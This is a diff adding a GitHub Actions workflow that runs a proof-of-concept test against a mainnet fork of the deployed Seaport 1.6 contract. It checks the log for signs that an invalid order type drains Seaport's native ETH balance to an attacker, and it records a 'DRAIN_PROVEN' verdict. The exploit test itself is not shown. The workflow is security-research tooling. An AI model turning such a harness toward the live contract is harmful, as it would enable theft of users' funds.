@@ -1,0 +1,142 @@
+name: Seaport invalid OrderType native-offer witness
+
+on:
+  push:
+    branches:
+      - research/seaport-breakthrough-20260907
+    paths:
+      - research/InvalidOrderTypeNativeOfferPoC.t.sol
+      - .github/workflows/seaport-invalid-order-type.yml
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    timeout-minutes: 75
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: v1.8.1
+
+      - name: Prepare exact Seaport 1.6 source
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p output
+          git clone https://github.com/ProjectOpenSea/seaport-1.6.git source
+          git -C source checkout 4240dc6b30fa73f4b6b437fb588ebe583e796e3a
+          git -C source submodule update --init --recursive
+          cp research/InvalidOrderTypeNativeOfferPoC.t.sol \
+            source/test/foundry/InvalidOrderTypeNativeOfferPoC.t.sol
+          {
+            echo "source_commit=$(git -C source rev-parse HEAD)"
+            echo "source_tree=$(git -C source rev-parse HEAD^{tree})"
+            echo "forge=$(forge --version | head -1)"
+          } | tee output/source-anchor.txt
+          sha256sum research/InvalidOrderTypeNativeOfferPoC.t.sol \
+            > output/witness.sha256
+
+      - name: Execute on exact deployed runtime
+        shell: bash
+        env:
+          SEAPORT: "0x0000000000000068F116a894984e2DB1123eB395"
+          EXPECTED_CODEHASH: "0x74499ac0cce14428e4b41541d5e44f28f5a6882a1051d0118867c2a93cd5aec0"
+        run: |
+          set -euo pipefail
+          : > output/rpc-probes.txt
+          PASSED=0
+
+          for RPC in \
+            https://ethereum-rpc.publicnode.com \
+            https://rpc.flashbots.net \
+            https://eth.llamarpc.com \
+            https://eth.drpc.org; do
+
+            CHAIN_ID=$(timeout 30s cast chain-id --rpc-url "$RPC" 2>/dev/null || true)
+            LATEST=$(timeout 30s cast block-number --rpc-url "$RPC" 2>/dev/null || true)
+            if [ "$CHAIN_ID" != "1" ] || ! [[ "$LATEST" =~ ^[0-9]+$ ]] || [ "$LATEST" -le 128 ]; then
+              echo "rpc=$RPC probe_failed" >> output/rpc-probes.txt
+              continue
+            fi
+
+            BLOCK=$((LATEST - 64))
+            CODE=$(timeout 45s cast code "$SEAPORT" --block "$BLOCK" --rpc-url "$RPC" 2>/dev/null || true)
+            CODEHASH=$(cast keccak "$CODE" 2>/dev/null || true)
+            INFO=$(timeout 30s cast call "$SEAPORT" \
+              'information()(string,bytes32,address)' \
+              --block "$BLOCK" --rpc-url "$RPC" 2>/dev/null || true)
+
+            printf 'rpc=%s\nchain_id=%s\nlatest=%s\nblock=%s\ncodehash=%s\ninformation=%s\n---\n' \
+              "$RPC" "$CHAIN_ID" "$LATEST" "$BLOCK" "$CODEHASH" "$INFO" \
+              >> output/rpc-probes.txt
+
+            if [ "$CODEHASH" != "$EXPECTED_CODEHASH" ] || ! printf '%s' "$INFO" | grep -q '1.6'; then
+              continue
+            fi
+
+            {
+              echo "chain_id=$CHAIN_ID"
+              echo "rpc=$RPC"
+              echo "fork_block=$BLOCK"
+              echo "seaport=$SEAPORT"
+              echo "runtime_codehash=$CODEHASH"
+              echo "runtime_codesize=$(( (${#CODE} - 2) / 2 ))"
+              echo "information=$(printf '%s' "$INFO" | tr '\n' ' ')"
+            } | tee output/runtime-anchor.txt
+
+            set +e
+            (
+              cd source
+              FOUNDRY_PROFILE=test forge test \
+                --fork-url "$RPC" \
+                --fork-block-number "$BLOCK" \
+                --match-path test/foundry/InvalidOrderTypeNativeOfferPoC.t.sol \
+                -vvvv
+            ) > ../output/forge-test.log 2>&1
+            RC=$?
+            set -e
+
+            if [ "$RC" -eq 0 ]; then
+              PASSED=1
+              break
+            fi
+
+            if grep -Eq 'Compiler run failed|Compilation failed|\[FAIL' output/forge-test.log; then
+              cat output/forge-test.log
+              exit "$RC"
+            fi
+          done
+
+          cat output/forge-test.log
+          test "$PASSED" -eq 1
+
+      - name: Validate evidence
+        shell: bash
+        run: |
+          set -euo pipefail
+          LOG=output/forge-test.log
+          grep -Eq '4 passed; 0 failed|4 tests passed' "$LOG"
+          grep -q 'raw_order_type: 5' "$LOG"
+          grep -q 'seeded_seaport_balance: 7000000000000000000' "$LOG"
+          grep -q 'attacker_delta: 7000000000000000000' "$LOG"
+          grep -q 'seaport_balance_after: 0' "$LOG"
+          grep -q 'accepted_raw_order_type: 6' "$LOG"
+          grep -q 'accepted_raw_order_type: 115792089237316195423570985008687907853269984665640564039457584007913129639935' "$LOG"
+          echo DEPLOYED_SEAPORT_INVALID_ORDER_TYPE_NATIVE_BALANCE_DRAIN_PROVEN \
+            | tee output/VERDICT.txt
+          grep -E '\[PASS\]|Suite result|raw_order_type|seeded_seaport_balance|attacker_delta|seaport_balance_after|accepted_raw_order_type' \
+            "$LOG" > output/evidence.txt
+          sha256sum output/* > output/SHA256SUMS.txt
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: seaport-invalid-order-type-${{ github.run_id }}
+          path: output
+          if-no-files-found: error
